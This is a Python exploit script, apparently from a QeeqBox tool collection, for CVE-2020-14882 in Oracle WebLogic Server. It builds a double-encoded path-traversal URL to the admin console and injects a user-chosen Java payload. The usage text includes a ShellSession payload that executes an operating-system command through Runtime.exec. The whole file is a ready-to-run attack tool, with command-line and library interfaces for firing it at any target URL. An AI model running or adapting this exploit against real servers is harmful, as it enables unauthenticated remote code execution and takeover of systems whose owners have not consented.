#!/usr/bin/env python3
# Oracle WebLogic Server Under Active Exploitation (CVE-2020-14882)

from argparse import ArgumentParser
from requests import Session
from logging import warning, error
from yaml import SafeLoader, load as yload

class QBExploit:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        self.exploit = '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle='

    def run_exploit(self):
        #Needed arguments
        if all(x in self.__dict__ for x in ["target","verify","headers", "payload", "exploit"]):
            if self.headers != None:
                self.headers = yload(self.headers,Loader=SafeLoader)
            if self.payload == None:
                self.exploit += 'java.lang.String(\'test\')'
            else:
                self.exploit += self.payload
            if self.headers == None:
                self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Content-Type':'text/xml'}
    
            if self.target == None:
                warning('[!] No target')
                return -1
            try:
                warning('[X] Executing {}'.format(self.target+self.exploit))
                r_session = Session()
                req = r_session.get(self.target+self.exploit,headers=self.headers,timeout=5,verify=False)
                #extra steps here
                if self.verify:
                    self.verify_exploit(req)
                return True
            except Exception as e:
                if hasattr(e, 'message'):
                    error('[!] Error: {}'.format(e.message))
                else:
                    error('[!] Error: {}'.format(e))
        else:
            error('[!] Error in exploit arguments')
        return False
        
    def verify_exploit(self,req):
        if req.status_code == 200:
            warning('[X] verified')
            return True
        return False

if __name__ == '__main__':

    print('''QeeqBox falcon (CVE-2020-14882 [passed])

------ How to Use (As Script) ------

CVE-2020-14882.py --target 'url' --payload 'java' --headers '{"User-Agent":"Testing","Content-Type":"text/xml"}' --verify 'true'

target      [Required]
payload     [Not required, default is java.lang.String('test')]
headers     [Not required, default is '{"User-Agent":"Mozilla/5.0...","Content-Type":"text/xml"}']
verify      [Not required, default is false]

Examples:
CVE-2020-14882.py --target http://1.1.1.1
CVE-2020-14882.py --target https://1.1.1.1 --payload java.lang.String('test')
CVE-2020-14882.py --target https://1.1.1.1 --payload com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec('calc.exe');');

------ How to Use (As Object)  ------

from CVE-2020-14882 import QBExploit
qbxploit = QBExploit(target='https://127.0.0.1',payload=None,headers=None,verify='true')
qbxploit.run_exploit()
''')
    warning('[X] Starting')
    parser = ArgumentParser()
    parser.add_argument('--target', type=str)
    parser.add_argument('--payload',type=str,required=False)
    parser.add_argument('--headers',type=str,required=False)
    parser.add_argument('--verify',type=str,required=False, default=False)
    args = parser.parse_args()
    qbxploit = QBExploit(**vars(args))
    qbxploit.run_exploit()
    warning('[X] Done')
